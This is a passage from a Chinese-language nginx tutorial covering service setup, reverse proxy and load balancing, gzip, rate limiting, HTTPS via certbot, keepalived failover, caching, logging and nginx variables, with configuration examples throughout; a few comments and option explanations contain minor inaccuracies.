echo -n &quot;Restarting $DESC: $NAME&quot;
do_stop
do_start
echo &quot;.&quot;
;;
*)
echo &quot;Usage: $scriptNAME &#123;start|stop|reload|restart&#125;&quot; &gt;&amp;2
exit 3
;;
esac
exit 0

设置所有人都有对这个启动脚本 nginx 文件的执行权限：
chmod a+x &#x2F;etc&#x2F;init.d&#x2F;nginx

把 nginx 加入系统服务中：
chkconfig --add nginx

把服务设置为开机启动：
chkconfig nginx on

reboot 重启系统生效，可以使用上面 systemctl 方法相同的命令：
systemctl start nginx.service # 启动nginx服务
systemctl enable nginx.service # 设置开机启动
systemctl disable nginx.service # 停止开机自启动
systemctl status nginx.service # 查看服务当前状态
systemctl restart nginx.service # 重新启动服务
systemctl is-enabled nginx.service #查询服务是否开机启动

如果服务启动的时候出现 Restarting nginx daemon: nginxnginx: [error] open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory) nginx not running 的错误，通过 nginx -c 参数指定配置文件即可解决
&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf

如果服务启动中出现 nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use) 的错误，可以先通过 service nginx stop 停止服务，再启动就好。
配置 nginx 全局可用当你每次改了 nginx.conf 配置文件的内容都需要重新到 nginx 启动目录去执行命令，或者通过 -p 参数指向特定目录，会不会感觉很麻烦？
例如： 直接执行 nginx -s reload 会报错 -bash: nginx: command not found，需要到 /usr/local/nginx/sbin 目录下面去执行，并且是执行 ./nginx -s reload。
这里有两种方式可以解决，一种是通过脚本对 nginx 命令包装，这里介绍另外一种比较简单：通过把 nginx 配置到环境变量里，用 nginx 执行指令即可。步骤如下：
1、编辑 /etc/profile
vi &#x2F;etc&#x2F;profile

2、在最后一行添加配置，:wq 保存
export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin

3、使配置立即生效
source &#x2F;etc&#x2F;profile

这样就可以愉快的直接在全局使用 nginx 命令了。
nginx 常用功能反向代理我们最常说的反向代理的是通过反向代理解决跨域问题。
其实反向代理还可以用来控制缓存（代理缓存 proxy cache），进行访问控制等等，以及后面说的负载均衡其实都是通过反向代理来实现的。
server &#123;

    listen    8080;

    # 用户访问 ip:8080&#x2F;test 下的所有路径代理到 github
    location &#x2F;test &#123;
     proxy_pass   https:&#x2F;&#x2F;github.com;
    &#125;

    # 所有 &#x2F;api 下的接口访问都代理到本地的 8888 端口
    # 例如你本地运行的 java 服务的端口是 8888，接口都是以 &#x2F;api 开头
    location &#x2F;api &#123;
        proxy_pass   http:&#x2F;&#x2F;127.0.0.1:8888;
    &#125;

&#125;

访问控制server &#123;
    location ~ ^&#x2F;index.html &#123;
        # 匹配 index.html 页面 除了 127.0.0.1 以外都可以访问
        deny 192.168.1.1;
        deny 192.168.1.2;
        allow all;
    &#125;
&#125;

上面的命令表示禁止 192.168.1.1 和 192.168.1.2 两个 ip 访问，其它全部允许。从上到下的顺序，匹配到了便跳出，可以按你的需求设置。
负载均衡通过负载均衡充利用服务器资源，nginx 目前支持自带 4 种负载均衡策略，还有 2 种常用的第三方策略。
轮询策略（默认）每个请求按时间顺序逐一分配到不同的后端服务器，如果有后端服务器挂掉，能自动剔除。但是如果其中某一台服务器压力太大，出现延迟，会影响所有分配在这台服务器下的用户。
http &#123;
    upstream test.com &#123;
        server 192.168.1.12:8887;
        server 192.168.1.13:8888;
    &#125;
    server &#123;
        location &#x2F;api &#123;
            proxy_pass  http:&#x2F;&#x2F;test.com;
        &#125;
    &#125;
&#125;

根据服务器权重例如要配置：10 次请求中大概 1 次访问到 8888 端口，9 次访问到 8887 端口：
http &#123;
    upstream test.com &#123;
        server 192.168.1.12:8887 weight&#x3D;9;
        server 192.168.1.13:8888 weight&#x3D;1;
    &#125;
    server &#123;
        location &#x2F;api &#123;
            proxy_pass  http:&#x2F;&#x2F;test.com;
        &#125;
    &#125;
&#125;

客户端 ip 绑定（ip_hash）来自同一个 ip 的请求永远只分配一台服务器，有效解决了动态网页存在的 session 共享问题。例如：比如把登录信息保存到了 session 中，那么跳转到另外一台服务器的时候就需要重新登录了。
所以很多时候我们需要一个客户只访问一个服务器，那么就需要用 ip_hash 了。
http &#123;
    upstream test.com &#123;
     ip_hash;
        server 192.168.1.12:8887;
        server 192.168.1.13:8888;
    &#125;
    server &#123;
        location &#x2F;api &#123;
            proxy_pass  http:&#x2F;&#x2F;test.com;
        &#125;
    &#125;
&#125;

最小连接数策略将请求优先分配给压力较小的服务器，它可以平衡每个队列的长度，并避免向压力大的服务器添加更多的请求。
http &#123;
    upstream test.com &#123;
     least_conn;
        server 192.168.1.12:8887;
        server 192.168.1.13:8888;
    &#125;
    server &#123;
        location &#x2F;api &#123;
            proxy_pass  http:&#x2F;&#x2F;test.com;
        &#125;
    &#125;
&#125;

最快响应时间策略（依赖于第三方 NGINX Plus）依赖于 NGINX Plus，优先分配给响应时间最短的服务器。
http &#123;
    upstream test.com &#123;
     fair;
        server 192.168.1.12:8887;
        server 192.168.1.13:8888;
    &#125;
    server &#123;
        location &#x2F;api &#123;
            proxy_pass  http:&#x2F;&#x2F;test.com;
        &#125;
    &#125;
&#125;

按访问 url 的 hash 结果（第三方）按访问 url 的 hash 结果来分配请求，使每个 url 定向到同一个后端服务器，后端服务器为缓存时比较有效。 在 upstream 中加入 hash 语句，server 语句中不能写入 weight 等其他的参数，hash_method 是使用的 hash 算法
http &#123;
    upstream test.com &#123;
     hash $request_uri;
     hash_method crc32;
     server 192.168.1.12:8887;
     server 192.168.1.13:8888;
    &#125;
    server &#123;
        location &#x2F;api &#123;
            proxy_pass  http:&#x2F;&#x2F;test.com;
        &#125;
    &#125;
&#125;

采用 HAproxy 的 loadbalance uri 或者 nginx 的 upstream_hash 模块，都可以做到针对 url 进行哈希算法式的负载均衡转发。
gzip 压缩开启 gzip 压缩可以大幅减少 http 传输过程中文件的大小，可以极大的提高网站的访问速度，基本是必不可少的优化操作：
gzip  on; # 开启gzip 压缩
# gzip_types
# gzip_static on;
# gzip_proxied expired no-cache no-store private auth;
# gzip_buffers 16 8k;
gzip_min_length 1k;
gzip_comp_level 4;
gzip_http_version 1.0;
gzip_vary off;
gzip_disable &quot;MSIE [1-6]\.&quot;;

解释一下：

 gzip_types：要采用 gzip 压缩的 MIME 文件类型，其中 text/html 被系统强制启用；
 gzip_static：默认 off，该模块启用后，Nginx 首先检查是否存在请求静态文件的 gz 结尾的文件，如果有则直接返回该 .gz 文件内容；
 gzip_proxied：默认 off，nginx 做为反向代理时启用，用于设置启用或禁用从代理服务器上收到相应内容 gzip 压缩；
 gzip_buffers：获取多少内存用于缓存压缩结果，16 8k 表示以 8k*16 为单位获得；
 gzip_min_length：允许压缩的页面最小字节数，页面字节数从 header 头中的 Content-Length 中进行获取。默认值是 0，不管页面多大都压缩。建议设置成大于 1k 的字节数，小于 1k 可能会越压越大；
 gzip_comp_level：gzip 压缩比，压缩级别是 1-9，1 压缩级别最低，9 最高，级别越高压缩率越大，压缩时间越长，建议 4-6；
 gzip_http_version：默认 1.1，启用 gzip 所需的 HTTP 最低版本；
 gzip_vary：用于在响应消息头中添加 Vary：Accept-Encoding，使代理服务器根据请求头中的 Accept-Encoding 识别是否启用 gzip 压缩；
 gzip_disable 指定哪些不需要 gzip 压缩的浏览器

其中第 2 点，普遍是结合前端打包的时候打包成 gzip 文件后部署到服务器上，这样服务器就可以直接使用 gzip 的文件了，并且可以把压缩比例提高，这样 nginx 就不用压缩，也就不会影响速度。一般不追求极致的情况下，前端不用做任何配置就可以使用啦~
附前端 webpack 开启 gzip 压缩配置，在 vue-cli3 的 vue.config.js 配置文件中：
const CompressionWebpackPlugin &#x3D; require(&#39;compression-webpack-plugin&#39;)

module.exports &#x3D; &#123;
  &#x2F;&#x2F; gzip 配置
  configureWebpack: config &#x3D;&gt; &#123;
    if (process.env.NODE_ENV &#x3D;&#x3D;&#x3D; &#39;production&#39;) &#123;
      &#x2F;&#x2F; 生产环境
      return &#123;
        plugins: [new CompressionWebpackPlugin(&#123;
          test: &#x2F;\.js$|\.html$|\.css&#x2F;,    &#x2F;&#x2F; 匹配文件名
          threshold: 1024,               &#x2F;&#x2F; 文件压缩阈值，对超过 1k 的进行压缩
          deleteOriginalAssets: false     &#x2F;&#x2F; 是否删除源文件
        &#125;)]
      &#125;
    &#125;
  &#125;,
  ...
&#125;

HTTP 服务器nginx 本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用 nginx 来做服务器：
server &#123;
  listen       80;
  server_name  localhost;

  location &#x2F; &#123;
      root   &#x2F;usr&#x2F;local&#x2F;app;
      index  index.html;
  &#125;
&#125;

这样如果访问 http://ip 就会默认访问到 /usr/local/app 目录下面的 index.html，如果一个网站只是静态页面的话，那么就可以通过这种方式来实现部署，比如一个静态官网。
动静分离就是把动态和静态的请求分开。方式主要有两种：

  一种是纯粹把静态文件独立成单独的域名，放在独立的服务器上，也是目前主流推崇的方案
  一种方法就是动态跟静态文件混合在一起发布， 通过 nginx 配置来分开

# 所有静态请求都由nginx处理，存放目录为 html
location ~ \.(gif|jpg|jpeg|png|bmp|swf|css|js)$ &#123;
    root    &#x2F;usr&#x2F;local&#x2F;resource;
    expires     10h; # 设置过期时间为10小时
&#125;

# 所有动态请求都转发给 tomcat 处理
location ~ \.(jsp|do)$ &#123;
    proxy_pass  127.0.0.1:8888;
&#125;

注意上面设置了 expires，当 nginx 设置了 expires 后，例如设置为：expires 10d; 那么，所在的 location 或 if 的内容，用户在 10 天内请求的时候，都只会访问浏览器中的缓存，而不会去请求 nginx 。
请求限制对于大流量恶意的访问，会造成带宽的浪费，给服务器增加压力。可以通过 nginx 对于同一 IP 的连接数以及并发数进行限制。合理的控制还可以用来防止 DDos 和 CC 攻击。
关于请求限制主要使用 nginx 默认集成的 2 个模块：

  limit_conn_module 连接频率限制模块
  limit_req_module 请求频率限制模块

涉及到的配置主要是：

  limit_req_zone 限制请求数
  limit_conn_zone 限制并发连接数

通过 limit_req_zone 限制请求数
http &#123;    
	limit_conn_zone $binary_remote_addrzone&#x3D;limit:10m; &#x2F;&#x2F; 设置共享内存空间大    
    server&#123;
        location &#x2F; &#123;
            limit_conn addr 5; # 同一用户地址同一时间只允许有5个连接。        
        &#125;
    &#125;
&#125;

如果共享内存空间被耗尽，服务器将会对后续所有的请求返回 503 (Service Temporarily Unavailable) 错误。
当多个 limit_conn_zone 指令被配置时，所有的连接数限制都会生效。比如，下面配置不仅会限制单一 IP 来源的连接数，同时也会限制单一虚拟服务器的总连接数：
limit_conn_zone $binary_remote_addr zone&#x3D;perip:10m;
limit_conn_zone $server_name zone&#x3D;perserver:10m;
server &#123;
    limit_conn perip 10; # 限制每个 ip 连接到服务器的数量    
    limit_conn perserver 2000; # 限制连接到服务器的总数
&#125;

通过 limit_conn_zone 限制并发连接数
limit_req_zone $binary_remote_addr zone&#x3D;creq:10 mrate&#x3D;10r&#x2F;s;
server &#123;
    location &#x2F; &#123;
    	limit_req zone&#x3D;creq burst&#x3D;5;    
    &#125;
&#125;

限制平均每秒不超过一个请求，同时允许超过频率限制的请求数不多于 5 个。 如果不希望超过的请求被延迟，可以用 nodelay 参数, 如：
limit_req zone=creq burst=5 nodelay;
这里只是简单讲讲，让大家有这个概念，配置的时候可以深入去找找资料。
正向代理正向代理，意思是一个位于客户端和原始服务器 (origin server) 之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理，比如我们使用的 VPN 服务就是正向代理，直观区别（图片来源于 **前端开发者必备的 Nginx 知识**）：

配置正向代理：
resolver 8.8.8.8 # 谷歌的域名解析地址
server &#123;
    resolver_timeout 5s; &#x2F;&#x2F; 设超时时间
    location &#x2F; &#123;
        # 当客户端请求我的时候，我会把请求转发给它
        # $host 要访问的主机名 $request_uri 请求路径
        proxy_pass http:&#x2F;&#x2F;$host$request_uri;
    &#125;
&#125;

正向代理的对象是客户端，服务器端看不到真正的客户端。
图片防盗链server &#123;
    listen       80;
    server_name  *.test;

    # 图片防盗链
    location ~* \.(gif|jpg|jpeg|png|bmp|swf)$ &#123;
        valid_referers none blocked server_names ~\.google\. ~\.baidu\. *.qq.com;  # 只允许本机 IP 外链引用，将百度和谷歌也加入白名单有利于 SEO
        if ($invalid_referer)&#123;
            return 403;
        &#125;
    &#125;
&#125;

以上设置就能防止其它网站利用外链访问我们的图片，有利于节省流量
适配 PC 或移动设备根据用户设备不同返回不同样式的站点，以前经常使用的是纯前端的自适应布局，但是复杂的网站并不适合响应式，无论是复杂性和易用性上面还是不如分开编写的好，比如我们常见的淘宝、京东。
根据用户请求的 user-agent 来判断是返回 PC 还是 H5 站点：
server &#123;
    listen 80;
    server_name test.com;

    location &#x2F; &#123;
     root  &#x2F;usr&#x2F;local&#x2F;app&#x2F;pc; # pc 的 html 路径
        if ($http_user_agent ~* &#39;(Android|webOS|iPhone|iPod|BlackBerry)&#39;) &#123;
            root &#x2F;usr&#x2F;local&#x2F;app&#x2F;mobile; # mobile 的 html 路径
        &#125;
        index index.html;
    &#125;
&#125;

设置二级域名新建一个 server 即可：
server &#123;
    listen 80;
    server_name admin.test.com; &#x2F;&#x2F; 二级域名

    location &#x2F; &#123;
        root  &#x2F;usr&#x2F;local&#x2F;app&#x2F;admin; # 二级域名的 html 路径
        index index.html;
    &#125;
&#125;

配置 HTTPS这里我使用的是 certbot 免费证书，但申请一次有效期只有 3 个月（好像可以用 crontab 尝试配置自动续期，我暂时没试过）：
先安装 certbot
wget https:&#x2F;&#x2F;dl.eff.org&#x2F;certbot-auto
chmod a+x certbot-auto

申请证书（注意：需要把要申请证书的域名先解析到这台服务器上，才能申请）:
sudo .&#x2F;certbot-auto certonly --standalone --email admin@abc.com -d test.com -d www.test.com

执行上面指令，按提示操作。
Certbot 会启动一个临时服务器来完成验证（会占用 80 端口或 443 端口，因此需要暂时关闭 Web 服务器），然后 Certbot 会把证书以文件的形式保存，包括完整的证书链文件和私钥文件。
文件保存在 /etc/letsencrypt/live/ 下面的域名目录下。
修改 nginx 配置：
server&#123;
    listen 443 ssl http2; &#x2F;&#x2F; 这里还启用了 http&#x2F;2.0

    ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;test.com&#x2F;fullchain.pem; # 证书文件地址
    ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;test.com&#x2F;privkey.pem; # 私钥文件地址

    server_name test.com www.test.com; &#x2F;&#x2F; 证书绑定的域名
&#125;

配置 HTTP 转 HTTPSserver &#123;
    listen      80;
    server_name test.com www.test.com;

    # 单域名重定向
    if ($host &#x3D; &#39;www.sherlocked93.club&#39;)&#123;
        return 301 https:&#x2F;&#x2F;www.sherlocked93.club$request_uri;
    &#125;

    # 全局非 https 协议时重定向
    if ($scheme !&#x3D; &#39;https&#39;) &#123;
        return 301 https:&#x2F;&#x2F;$server_name$request_uri;
    &#125;

    # 或者全部重定向
    return 301 https:&#x2F;&#x2F;$server_name$request_uri;
&#125;

以上配置选择自己需要的一条即可，不用全部加。
单页面项目 history 路由配置server &#123;
    listen       80;
    server_name  fe.sherlocked93.club;

    location &#x2F; &#123;
        root       &#x2F;usr&#x2F;local&#x2F;app&#x2F;dist;  # vue 打包后的文件夹
        index      index.html index.htm;
        try_files  $uri $uri&#x2F; &#x2F;index.html @rewrites; # 默认目录下的 index.html，如果都不存在则重定向

        expires -1;                          # 首页一般没有强制缓存
        add_header Cache-Control no-cache;
    &#125;

    location @rewrites &#123; &#x2F;&#x2F; 重定向设置
        rewrite ^(.+)$ &#x2F;index.html break;
    &#125;
&#125;

vue-router 官网只有一句话 try_files $uri $uri/ /index.html;，而上面做了一些重定向处理。
配置高可用集群（双机热备）当主 nginx 服务器宕机之后，切换到备份的 nginx 服务器
首先安装 keepalived:
yum install keepalived -y

然后编辑 /etc/keepalived/keepalived.conf 配置文件，并在配置文件中增加 vrrp_script 定义一个外围检测机制，并在 vrrp_instance 中通过定义 track_script 来追踪脚本执行过程，实现节点转移：
global_defs&#123;
   notification_email &#123;
        cchroot@gmail.com
   &#125;
   notification_email_from test@firewall.loc
   smtp_server 127.0.0.1
   smtp_connect_timeout 30 &#x2F;&#x2F; 上面都是邮件配置
   router_id LVS_DEVEL     &#x2F;&#x2F; 当前服务器名字，用 hostname 命令来查看
&#125;
vrrp_script chk_maintainace &#123; &#x2F;&#x2F; 检测机制的脚本名称为chk_maintainace
    script &quot;[[ -e&#x2F;etc&#x2F;keepalived&#x2F;down ]] &amp;&amp; exit 1 || exit 0&quot; &#x2F;&#x2F; 可以是脚本路径或脚本命令
    &#x2F;&#x2F; script &quot;&#x2F;etc&#x2F;keepalived&#x2F;nginx_check.sh&quot;    &#x2F;&#x2F; 比如这样的脚本路径
    interval 2  &#x2F;&#x2F; 每隔2秒检测一次
    weight -20  &#x2F;&#x2F; 当脚本执行成立，那么把当前服务器优先级改为-20
&#125;
vrrp_instanceVI_1 &#123;   &#x2F;&#x2F; 每一个vrrp_instance就是定义一个虚拟路由器
    state MASTER      &#x2F;&#x2F; 主机为MASTER，备用机为BACKUP
    interface eth0    &#x2F;&#x2F; 网卡名字，可以从ifconfig中查找
    virtual_router_id 51 &#x2F;&#x2F; 虚拟路由的id号，一般小于255，主备机id需要一样
    priority 100      &#x2F;&#x2F; 优先级，master的优先级比backup的大
    advert_int 1      &#x2F;&#x2F; 默认心跳间隔
    authentication &#123;  &#x2F;&#x2F; 认证机制
        auth_type PASS
        auth_pass 1111   &#x2F;&#x2F; 密码
    &#125;
    virtual_ipaddress &#123;  &#x2F;&#x2F; 虚拟地址vip
       172.16.2.8
    &#125;
&#125;

其中检测脚本 nginx_check.sh，这里提供一个：
#!&#x2F;bin&#x2F;bash
A&#x3D;&#96;ps -C nginx --no-header | wc -l&#96;
if [ $A -eq 0 ];then
    &#x2F;usr&#x2F;sbin&#x2F;nginx # 尝试重新启动nginx
    sleep 2         # 睡眠2秒
    if [ &#96;ps -C nginx --no-header | wc -l&#96; -eq 0 ];then
        killall keepalived # 启动失败，将keepalived服务杀死。将vip漂移到其它备份节点
    fi
fi

复制一份到备份服务器，备份 nginx 的配置要将 state 后改为 BACKUP，priority 改为比主机小。 设置完毕后各自 service keepalived start 启动，经过访问成功之后，可以把 Master 机的 keepalived 停掉，此时 Master 机就不再是主机了 service keepalived stop，看访问虚拟 IP 时是否能够自动切换到备机 ip addr。
再次启动 Master 的 keepalived，此时 vip 又变到了主机上。
配置高可用集群的内容来源于：**Nginx 从入门到实践，万字详解！**
其它功能和技巧代理缓存nginx 的 http_proxy 模块，提供类似于 Squid 的缓存功能，使用 proxy_cache_path 来配置。
nginx 可以对访问过的内容在 nginx 服务器本地建立副本，这样在一段时间内再次访问该数据，就不需要通过 nginx 服务器再次向后端服务器发出请求，减小数据传输延迟，提高访问速度：
proxy_cache_path usr&#x2F;local&#x2F;cache levels&#x3D;1:2 keys_zone&#x3D;my_cache:10m;

server &#123;
  listen       80;
  server_name  test.com;

  location &#x2F; &#123;
      proxy_cache my_cache;
      proxy_pass http:&#x2F;&#x2F;127.0.0.1:8888;
      proxy_set_header Host $host;
  &#125;
&#125;

上面的配置表示： nginx 提供一块 10 M 的内存用于缓存，名字为 my_cache, levels 等级为 1:2，缓存存放的路径为 usr/local/cache。
访问日志访问日志默认是注释的状态，需要可以打开和进行更详细的配置，一下是 nginx 的默认配置：
http &#123;
    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;
                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;
                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;

    access_log  logs&#x2F;access.log  main;
&#125;

错误日志错误日志放在 main 全局区块中，童鞋们打开 nginx.conf 就可以看见在配置文件中和下面一样的代码了：
#error_log  logs&#x2F;error.log;
#error_log  logs&#x2F;error.log  notice;
#error_log  logs&#x2F;error.log  info;

nginx 错误日志默认配置为：
error_log logs/error.log error;
静态资源服务器server &#123;
    listen       80;
    server_name  static.bin;
    charset utf-8;    # 防止中文文件名乱码

    location &#x2F;download &#123;
        alias           &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;static;  # 静态资源目录

        autoindex               on;    # 开启静态资源列目录，浏览目录权限
        autoindex_exact_size    off;   # on(默认)显示文件的确切大小，单位是byte；off显示文件大概大小，单位KB、MB、GB
        autoindex_localtime     off;   # off(默认)时显示的文件时间为GMT时间；on显示的文件时间为服务器时间
    &#125;
&#125;

禁止指定 user_agentnginx 可以禁止指定的浏览器和爬虫框架访问：
# http_user_agent 为浏览器标识
# 禁止 user_agent 为baidu、360和sohu，~*表示不区分大小写匹配
if ($http_user_agent ~* &#39;baidu|360|sohu&#39;) &#123;
    return 404;
&#125;

# 禁止 Scrapy 等工具的抓取
if ($http_user_agent ~* (Scrapy|Curl|HttpClient)) &#123;
    return 403;

请求过滤根据请求类型过滤# 非指定请求全返回 403
if ( $request_method !~ ^(GET|POST|HEAD)$ ) &#123;
    return 403;
&#125;

根据状态码过滤error_page 502 503 &#x2F;50x.html;
location &#x3D; &#x2F;50x.html &#123;
    root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;
&#125;

这样实际上是一个内部跳转，当访问出现 502、503 的时候就能返回 50x.html 中的内容，这里需要注意是否可以找到 50x.html 页面，所以加了个 location 保证找到你自定义的 50x 页面。
根据 URL 名称过滤if ($host &#x3D; zy.com&#39;) &#123;     
    #其中 $1是取自regex部分()里的内容,匹配成功后跳转到的URL。     
    rewrite ^&#x2F;(.*)$ http:&#x2F;&#x2F;www.zy.com&#x2F;$1  permanent；
&#125;

location &#x2F;test &#123;    
	&#x2F;&#x2F; &#x2F;test 全部重定向到首页    
	rewrite  ^(.*)$ &#x2F;index.html  redirect;
&#125;

ab 命令ab 命令全称为：Apache bench，是 Apache 自带的压力测试工具，也可以测试 Nginx、IIS 等其他 Web 服务器:

  -n 总共的请求数
  -c 并发的请求数
  -t 测试所进行的最大秒数，默认值 为 50000
  -p 包含了需要的 POST 的数据文件
  -T POST 数据所使用的 Content-type 头信息

ab -n 1000 -c 5000 http:&#x2F;&#x2F;127.0.0.1&#x2F; # 每次发送1000并发的请求数，请求数总数为5000。

测试前需要安装 httpd-tools： yum install httpd-tools
泛域名路径分离这是一个非常实用的技能，经常有时候我们可能需要配置一些二级或者三级域名，希望通过 nginx 自动指向对应目录，比如：

 test1.doc.test.club 自动指向 /usr/local/html/doc/test1 服务器地址；
 test2.doc.test.club 自动指向 /usr/local/html/doc/test2 服务器地址；

server &#123;    
    listen       80;    
    server_name  ~^([\w-]+)\.doc\.test\.club$;    
    root &#x2F;usr&#x2F;local&#x2F;html&#x2F;doc&#x2F;$1;
&#125;

泛域名转发和之前的功能类似，有时候我们希望把二级或者三级域名链接重写到我们希望的路径，让后端就可以根据路由解析不同的规则：

 test1.serv.test.club/api?name=a 自动转发到 127.0.0.1:8080/test1/api?name=a
 test2.serv.test.club/api?name=a 自动转发到 127.0.0.1:8080/test2/api?name=a

server &#123;    
    listen       80;    
    server_name ~^([\w-]+)\.serv\.test\.club$;    
    location &#x2F; &#123;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $http_host;
        proxy_set_header X-NginX-Proxy true;
        proxy_pass http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;$1$request_uri;
    &#125;
&#125;

常见问题nginx 中怎么设置变量或许你不知道，nginx 的配置文件使用的是一门微型的编程语言。既然是编程语言，一般也就少不了 “变量” 这种东西，但是在 nginx 配置中，变量只能存放一种类型的值，因为也只存在一种类型的值，那就是字符串。
例如我们在 nginx.conf 中有这样一行配置：
set $name &quot;chroot&quot;;

上面使用了 set 配置指令对变量 $name进行了赋值操作，把 &quot;chroot&quot; 赋值给了 $name。nginx 变量名前面有一个 $ 符号，这是记法上的要求。所有的 Nginx 变量在 Nginx 配置文件中引用时都须带上 $ 前缀。这种表示方法和 Perl、PHP 这些语言是相似的。
这种表示方法的用处在哪里呢，那就是可以直接把变量嵌入到字符串常量中以构造出新的字符串，例如你需要进行一个字符串拼接：
server &#123;
  listen       80;
  server_name  test.com;

  location &#x2F; &#123;
     set $temp hello;
     return &quot;$temp world&quot;;
  &#125;
&#125;

以上当匹配成功的时候就会返回字符串 &quot;hello world&quot; 了。需要注意的是，当引用的变量名之后紧跟着变量名的构成字符时（比如后跟字母、数字以及下划线），我们就需要使用特别的记法来消除歧义，例如：
server &#123;
  listen       80;
  server_name  test.com;

  location &#x2F; &#123;
     set $temp &quot;hello &quot;;
     return &quot;$&#123;temp&#125;world&quot;;
  &#125;
&#125;

这里，我们在配置指令的参数值中引用变量 $temp 的时候，后面紧跟着 world 这个单词，所以如果直接写作 &quot;$tempworld&quot; 则 nginx 的计算引擎会将之识别为引用了变量 $tempworld. 为了解决这个问题，nginx 的字符串支持使用花括号在 $ 之后把变量名围起来，比如这里的 $&#123;temp&#125;，所以 上面这个例子返回的还是 &quot;hello world&quot;：
$ curl &#39;http:&#x2F;&#x2F;test.com&#x2F;&#39;
    hello world

还需要注意的是，若是想输出 $ 符号本身，可以这样做：
geo $dollar &#123;
    default &quot;$&quot;;
&#125;
server &#123;
    listen       80;
    server_name  test.com;

    location &#x2F; &#123;
        set $temp &quot;hello &quot;;
        return &quot;$&#123;temp&#125;world: $dollar&quot;;
    &#125;
&#125;

上面用到了标准模块 ngx_geo 提供的配置指令 geo 来为变量 $dollar 赋予字符串 &quot;$&quot; ，这样，这里的返回值就是 &quot;hello world: $&quot; 了。
附 nginx 内置预定义变量按字母顺序，变量名与对应定义：

  $arg_PARAMETER #GET 请求中变量名 PARAMETER 参数的值
  $args #这个变量等于 GET 请求中的参数，例如，foo=123&amp;bar=blahblah; 这个变量可以被修改
  $binary_remote_addr #二进制码形式的客户端地址
  $body_bytes_sent #传送页面的字节数
  $content_length #请求头中的 Content-length 字段
  $content_type #请求头中的 Content-Type 字段
  $cookie_COOKIE #cookie COOKIE 的值
  $document_root #当前请求在 root 指令中指定的值
  $document_uri #与 $uri 相同
  $host #请求中的主机头 (Host) 字段，如果请求中的主机头不可用或者空，则为处理请求的 server 名称(处理请求的 server 的 server_name 指令的值)。值为小写，不包含端口
  $hostname #机器名使用 gethostname 系统调用的值
  $http_HEADER #HTTP 请求头中的内容，HEADER 为 HTTP 请求中的内容转为小写，- 变为_(破折号变为下划线)，例如：$http_user_agent(Uaer-Agent 的值)
  $sent_http_HEADER #HTTP 响应头中的内容，HEADER 为 HTTP 响应中的内容转为小写，- 变为_(破折号变为下划线)，例如：sent_http_content_type…
  $is_args #如果 $args 设置，值为 &quot;?&quot;，否则为 &quot;&quot;
  $limit_rate #这个变量可以限制连接速率
  $nginx_version #当前运行的 nginx 版本号
  $query_string #与 $args 相同
  $remote_addr #客户端的 IP 地址
  $remote_port #客户端的端口
  $remote_port #已经经过 Auth Basic Module 验证的用户名
  $request_filename #当前连接请求的文件路径，由 root 或 alias 指令与 URI 请求生成
  $request_body #这个变量（0.7.58+）包含请求的主要信息。在使用 proxy_pass 或 fastcgi_pass 指令的 location 中比较有意义
  $request_body_file #客户端请求主体信息的临时文件名
  $request_completion #如果请求成功，设为 &quot;OK&quot;；如果请求未完成或者不是一系列请求中最后一部分则设为空
  $request_method #这个变量是客户端请求的动作，通常为 GET 或 POST。包括 0.8.20 及之前的版本中，这个变量总为 main request 中的动作，如果当前请求是一个子请求，并不使用这个当前请求的动作
  $request_uri #这个变量等于包含一些客户端请求参数的原始 URI，它无法修改，请查看 $uri 更改或重写 URI
  $scheme #所用的协议，例如 http 或者是 https，例如 rewrite ^(.+)$$scheme://example.com$1 redirect
  $server_addr #服务器地址，在完成一次系统调用后可以确定这个值，如果要绕开系统调用，则必须在 listen 中指定地址并且使用 bind 参数
  $server_name #服务器名称
  $server_port #请求到达服务器的端口号
  $server_protocol #请求使用的协议，通常是 HTTP/1.0、HTTP/1.1 或 HTTP/2
  $uri #请求中的当前 URI(不带请求参数，参数位于 args) ， 不 同 于 浏 览 器 传 递 的 args)，不同于浏览器传递的 args)，不同于浏览器传递的 request_uri 的值，它可以通过内部重定向，或者使用 index 指令进行修改。不包括协议和主机名，例如 /foo/bar.html

附 nginx 模块nginx 模块分类
  核心模块：nginx 最基本最核心的服务，如进程管理、权限控制、日志记录；
  标准 HTTP 模块：nginx 服务器的标准 HTTP 功能；
  可选 HTTP 模块：处理特殊的 HTTP 请求
  邮件服务模块：邮件服务
  第三方模块：作为扩展，完成特殊功能

模块清单核心模块：

  ngx_core
  ngx_errlog
  ngx_conf
  ngx_events
  ngx_event_core
  ngx_epll
  ngx_regex

标准 HTTP 模块：

  ngx_http
  ngx_http_core #配置端口，URI 分析，服务器相应错误处理，别名控制 (alias) 等
  ngx_http_log #自定义 access 日志
  ngx_http_upstream #定义一组服务器，可以接受来自 proxy, Fastcgi,Memcache 的重定向；主要用作负载均衡
  ngx_http_static
  ngx_http_autoindex #自动生成目录列表
  ngx_http_index #处理以 / 结尾的请求，如果没有找到 index 页，则看是否开启了 random_index；如开启，则用之，否则用 autoindex
  ngx_http_auth_basic #基于 http 的身份认证 (auth_basic)
  ngx_http_access #基于 IP 地址的访问控制 (deny,allow)
  ngx_http_limit_conn #限制来自客户端的连接的响应和处理速率
  ngx_http_limit_req #限制来自客户端的请求的响应和处理速率
  ngx_http_geo
  ngx_http_map #创建任意的键值对变量
  ngx_http_split_clients
  ngx_http_referer #过滤 HTTP 头中 Referer 为空的对象
